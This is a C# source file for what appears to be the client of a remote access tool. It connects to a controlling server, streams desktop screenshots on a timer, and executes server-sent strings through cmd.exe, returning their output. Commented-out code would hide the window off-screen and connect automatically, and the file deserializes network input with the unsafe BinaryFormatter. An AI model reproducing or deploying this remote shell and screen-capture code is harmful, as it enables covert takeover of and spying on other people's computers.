﻿using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;

namespace netRAtoolClient
{
    public partial class Form1 : Form
    {
        private readonly TcpClient clientIMG = new TcpClient();
        private readonly TcpClient clientCMD = new TcpClient();
        private NetworkStream mainStream;

        private int portNumberIMG = 7679;
        private int portNumberCMD = 7678;

        private string ipAddr = "127.0.0.1";

        private Thread ListeningServer;

        private static Image TakeDesktop()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            Graphics graphic = Graphics.FromImage(screenshot);

            graphic.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            return screenshot;
        }

        private void SendDesktopImage()
        {
            BinaryFormatter binFormatter = new BinaryFormatter();

            mainStream = clientIMG.GetStream();
            binFormatter.Serialize(mainStream, TakeDesktop());
        }

        private String execCommand(String argCommand)
        {
            string outProc = "";
            System.Diagnostics.Process proc = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();

            startInfo.FileName = "cmd.exe";
            startInfo.Arguments = argCommand;
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;

            proc.StartInfo = startInfo;
            proc.Start();
            while (!proc.HasExited)
            {
                outProc += proc.StandardOutput.ReadToEnd();
            }

            return outProc;
        }

        private void ListenFromServer()
        {
            NetworkStream stream;
            BinaryFormatter binFormatterSend = new BinaryFormatter();
            String outToServer;
            Console.WriteLine("ListenFromServer start");

            while (true)
            {
                try
                {
                    stream = clientCMD.GetStream();

                    outToServer = (String)binFormatterSend.Deserialize(stream);
                    Console.WriteLine("#EXEC: execute cmd: " + outToServer);
                    outToServer = execCommand(outToServer);
                    if (stream.CanWrite)
                    {
                        binFormatterSend.Serialize(stream, outToServer);
                    }
                }
                catch
                {
                    Console.WriteLine("# ListenFromServer: Execute error!!!");
                }
            }
            Console.WriteLine("ListenFromServer finish");
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            SendDesktopImage();
        }

        private void btnConnectClick_Click(object sender, EventArgs e)
        {
            try
            {
                clientIMG.Connect(ipAddr, portNumberIMG);
                Console.WriteLine("# clientIMG: Connected to server");

                clientCMD.Connect(ipAddr, portNumberCMD);
                Console.WriteLine("# clientCMD: Connected to server");

                ListeningServer = new Thread(ListenFromServer);

                timer1.Start();
                ListeningServer.Start();
            }
            catch(Exception)
            {
                Console.WriteLine("#Failed to connect");
            }
        }


        public Form1()
        {
            InitializeComponent();
            //Load += Form1_Shown;
        }

        /*
        private void Form1_Shown(Object sender, EventArgs e)
        {
            this.Location = new Point(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            btnConnectClick.PerformClick();
        }
        */
    }
}
